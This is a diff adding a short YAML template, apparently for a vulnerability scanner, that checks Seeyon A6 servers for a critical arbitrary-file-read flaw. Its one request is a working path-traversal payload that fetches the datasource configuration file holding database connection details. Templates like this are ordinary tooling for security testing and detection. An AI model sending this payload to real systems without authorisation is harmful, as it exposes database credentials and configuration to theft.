@@ -1,0 +1,16 @@
+id: poc-yaml-seeyon-a6-directory-traversal
+info:
+  name: 致远 A6 任意文件读取漏洞
+  severity: critical
+  tags:
+  - 文件读取
+  finger: Seeyon
+  osprey-id: vb_2022_0098
+requests:
+- method: GET
+  path: /seeyon/webmail.do?method=doDownloadAtt&filename=test.txt&filePath=../conf/datasourceCtp.properties
+  expression: 'contains(body, "workflow.dialect") && contains(body, "ctpDataSource.url")
+
+    '
+variables: {}
+transport: http
